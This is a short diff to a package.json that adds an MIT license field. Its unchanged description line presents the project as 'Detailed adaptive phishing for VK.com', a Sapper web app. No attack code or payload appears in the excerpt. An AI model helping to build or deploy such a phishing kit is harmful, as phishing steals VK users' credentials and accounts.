@@ -4,6 +4,7 @@
   "description": "Detailed adaptive phishing for VK.com",
   "main": "./index.js",
   "module": "./index.mjs",
+  "license": "MIT",
   "scripts": {
     "build": "sapper build --legacy",
     "dev": "sapper dev",
